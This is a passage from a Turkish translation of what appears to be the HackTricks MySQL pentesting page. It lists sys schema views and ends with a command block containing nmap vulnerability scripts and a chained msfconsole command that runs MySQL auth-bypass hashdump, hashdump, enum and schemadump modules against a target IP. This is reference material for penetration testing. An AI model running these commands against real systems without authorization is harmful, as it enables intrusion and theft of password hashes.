- `user_summary_by_statement_latency`: İfade gecikmesine göre kullanıcı özetleri
- `user_summary_by_statement_type`: İfade türüne göre kullanıcı özetleri
- `version`: MySQL sürüm bilgisi
- `wait_classes_global_by_avg_latency`: Ortalama gecikmeye göre bekleme sınıfları
- `wait_classes_global_by_latency`: Gecikmeye göre bekleme sınıfları
- `waits_by_host_by_latency`: Gecikmeye göre ana bilgisayara göre beklemeler
- `waits_by_user_by_latency`: Gecikmeye göre kullanıcıya göre beklemeler
- `waits_global_by_latency`: Gecikmeye göre beklemeler
- `x$host_summary`: Ana bilgisayar özetleri
- `x$host_summary_by_file_io`: Dosya G/Ç türüne göre ana bilgisayar özetleri
- `x$host_summary_by_file_io_type`: Dosya G/Ç türüne göre ana bilgisayar özetleri
- `x$host_summary_by_stages`: Aşama türüne göre ana bilgisayar özetleri
- `x$host_summary_by_statement_latency`: İfade gecikmesine göre ana bilgisayar özetleri
- `x$host_summary_by_statement_type`: İfade türüne göre ana bilgisayar özetleri
- `x$innodb_buffer_stats_by_schema`: Şemaya göre InnoDB tampon istatistikleri
- `x$innodb_buffer_stats_by_table`: Tabloya göre InnoDB tampon istatistikleri
- `x$innodb_lock_waits`: InnoDB kilit beklemeleri
- `x$io_by_thread_by_latency`: Gecikmeye göre I/O iş parçacığı
- `x$io_global_by_file_by_bytes`: Bayt başına göre global I/O dosya istatistikleri
- `x$io_global_by_file_by_latency`: Gecikmeye göre global I/O dosya istatistikleri
- `x$io_global_by_wait_by_bytes`: Bayt başına göre global I/O bekleme istatistikleri
- `x$io_global_by_wait_by_latency`: Gecikmeye göre global I/O bekleme istatistikleri
- `x$latest_file_io`: Son dosya G/Ç işlemleri
- `x$memory_by_host_by_current_bytes`: Geçerli baytlara göre ana bilgisayar belleği
- `x$memory_by_thread_by_current_bytes`: Geçerli baytlara göre iş parçacığı belleği
- `x$memory_by_user_by_current_bytes`: Geçerli baytlara göre kullanıcı belleği
- `x$memory_global_by_current_bytes`: Geçerli baytlara göre global bellek
- `x$memory_global_total`: Toplam global bellek
- `x$processlist`: İşlem listesi
- `x$ps_digest_95th_percentile_by_avg_us`: Ortalama mikrosaniyeye göre yüzdelik dilimdeki sorgu özeti
- `x$ps_digest_avg_latency_distribution`: Ortalama gecikmeye göre sorgu özeti dağılımı
- `x$ps_schema_table_statistics_io`: Şema ve tablo istatistikleri G/Ç
- `x$schema_flattened_keys`: Düzleştirilmiş şema anahtarları
- `x$schema_index_statistics`: Şema indeks istatistikleri
- `x$schema_table_lock_waits`: Şema ve tablo kilit beklemeleri
- `x$schema_table_statistics`: Şema ve tablo istatistikleri
- `x$schema_table_statistics_with_buffer`: Tampon ile şema ve tablo istatistikleri
- `x$schema_tables_with_full_table_scans`: Tam tablo taramaları ile şema ve tablolar
- `x$session`: Oturum bilgileri
- `x$statement_analysis`: İfadelerin analizi
- `x$statements_with_errors_or_warnings`: Hatalı veya uyarılı ifadeler
- `x$statements_with_full_table_scans`: Tam tablo taramaları ile ifadeler
- `x$statements_with_runtimes_in_95th_percentile`: İfadelerin 95. yüzdelik dilimde çalışma süreleri
- `x$statements_with_sorting`: Sıralama içeren ifadeler
- `x$statements_with_temp_tables`: Geçici tablolar içeren ifadeler
- `x$user_summary`: Kullanıcı özetleri
- `x$user_summary_by_file_io`: Dosya G/Ç türüne göre kullanıcı özetleri
- `x$user_summary_by_file_io_type`: Dosya G/Ç türüne göre kullanıcı özetleri
- `x$user_summary_by_stages`: Aşama türüne göre kullanıcı özetleri
- `x$user_summary_by_statement_latency`: İfade gecikmesine göre kullanıcı özetleri
- `x$user_summary_by_statement_type`: İfade türüne göre kullanıcı özetleri
- `x$wait_classes_global_by_avg_latency`: Ortalama gecikmeye göre bekleme sınıfları
- `x$wait_classes_global_by_latency`: Gecikmeye göre bekleme sınıfları
- `x$waits_by_host_by_latency`: Gecikmeye göre ana bilgisayara göre beklemeler
- `x$waits_by_user_by_latency`: Gecikmeye göre kullanıcıya göre beklemeler
- `x$waits_global_by_latency`: Gecikmeye göre beklemeler
```
Protocol_Name: MySql    #Protocol Abbreviation if there is one.
Port_Number:  3306     #Comma separated if there is more than one.
Protocol_Description: MySql     #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for MySql
Note: |
MySQL is a freely available open source Relational Database Management System (RDBMS) that uses Structured Query Language (SQL).

https://book.hacktricks.xyz/pentesting/pentesting-mysql

Entry_2:
Name: Nmap
Description: Nmap with MySql Scripts
Command: nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse {IP} -p 3306

Entry_3:
Name: MySql
Description: Attempt to connect to mysql server
Command: mysql -h {IP} -u {Username}@localhost

Entry_4:
Name: MySql consolesless mfs enumeration
Description: MySql enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_version; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_authbypass_hashdump; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/admin/mysql/mysql_enum; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_hashdump; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_schemadump; set RHOSTS {IP}; set RPORT 3306; run; exit'

```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) İspanya'daki en ilgili siber güvenlik etkinliği ve Avrupa'daki en önemli etkinliklerden biridir. Teknik bilginin teşvik edilmesi misyonuyla, bu kongre, her disiplindeki teknoloji ve siber güvenlik profesyonelleri için kaynayan bir buluşma noktasıdır.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hacklemeyi öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u takip edin.
* Hacking hilelerinizi **HackTricks** ve **HackTricks Cloud** github reposuna PR göndererek paylaşın.

</details>
